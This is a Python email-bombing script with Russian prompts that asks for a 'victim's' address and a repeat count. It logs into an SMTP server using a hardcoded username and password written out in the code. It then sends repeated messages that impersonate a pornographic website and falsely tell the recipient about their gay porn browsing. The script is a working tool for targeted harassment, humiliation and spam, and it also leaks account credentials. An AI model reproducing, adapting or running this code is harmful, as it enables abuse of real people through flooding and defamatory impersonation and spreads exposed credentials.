import smtplib
import time
import colorama
from colorama import Fore, Back, Style
colorama.init()
info = '''

|*********************************|
|   Создатель скрипта Homxterm    |
|    Не используйте данное ПО     |
|       В целях навредить         |
|Создатель не несёт отвественность|
|    за ваши действия, удачи!     |
|период между циклами 1 секунда   |
|_________________________________|

██╗░░██╗░█████╗░███╗░░░███╗██╗░░██╗████████╗███████╗██████╗░███╗░░░███╗
██║░░██║██╔══██╗████╗░████║╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗████╗░████║
███████║██║░░██║██╔████╔██║░╚███╔╝░░░░██║░░░█████╗░░██████╔╝██╔████╔██║
██╔══██║██║░░██║██║╚██╔╝██║░██╔██╗░░░░██║░░░██╔══╝░░██╔══██╗██║╚██╔╝██║
██║░░██║╚█████╔╝██║░╚═╝░██║██╔╝╚██╗░░░██║░░░███████╗██║░░██║██║░╚═╝░██║
╚═╝░░╚═╝░╚════╝░╚═╝░░░░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝
'''
print(Fore.GREEN + info)
time.sleep(2)
aggr = ' HOMX'
  
for n in range(30):
    print(Fore.RED + aggr * 15)
    time.sleep(0.1)
    
print(Fore.GREEN + 'starting...')
time.sleep(1)
HOST = "smtp.mail.ru"
SUBJECT = "pornosite xvideos.com"
TO = input('Email жертвы: ')
b = input("Количество циклов: ")
a = int(b)
i = 1
a + 1
FROM = "mokhnatka228@inbox.ru"

text = "Your recent request, under the nickname short_barrel, to the category Gay Porn on https://xvideos.com was analyzed by our moderators and we want to please you with a 10% discount and updated video categories such as: BDSM and cock sucking. Sincerely, The administration of the site xvideos.com. Waiting for your return !!!"
msg = 'From: %s\r\nTo: %s\r\nContent-Type: text/html; charset="utf-8"\r\nSubject: %s\r\n\r\n' % (FROM, TO, SUBJECT)
msg += text
BODY = "\r\n".join((
    "From: %s" % FROM,
    "To: %s" % TO,
    "Subject: %s" % SUBJECT ,
    "",
    msg
))
print(Fore.RED + "Connecting to servers...")
time.sleep(1)
server = smtplib.SMTP(HOST, 587, timeout=30)
server.set_debuglevel(1)
server.starttls()
def restart():
 server = smtplib.SMTP(HOST, 587, timeout=30)
 server.set_debuglevel(1)
 server.starttls()
 server.quit()
 #server.login('mokhnatka228@inbox.ru', 'UP3po2ubu+OT')
server.login('mokhnatka228@inbox.ru', 'UP3po2ubu+OT')
while i < a:
  print(i)
  server.sendmail(FROM, TO, BODY)
  i = i + 1
  if i == 4:
   restart()
print(Fore.GREEN + '''
██████╗░░█████╗░██████╗░███████╗██████╗░░██╗░░░░░░░██╗███████╗██╗░░██╗░█████╗░░░░░░░░░░
╚════██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗░██║░░██╗░░██║██╔════╝██║░░██║██╔══██╗░░░░░░░░░
░█████╔╝███████║██████╦╝█████╗░░██████╔╝░╚██╗████╗██╔╝█████╗░░███████║██║░░██║░░░░░░░░░
░╚═══██╗██╔══██║██╔══██╗██╔══╝░░██╔═══╝░░░████╔═████║░██╔══╝░░██╔══██║██║░░██║░░░░░░░░░
██████╔╝██║░░██║██████╦╝███████╗██║░░░░░░░╚██╔╝░╚██╔╝░███████╗██║░░██║╚█████╔╝██╗██╗██╗
╚═════╝░╚═╝░░╚═╝╚═════╝░╚══════╝╚═╝░░░░░░░░╚═╝░░░╚═╝░░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝╚═╝╚═╝




''')

 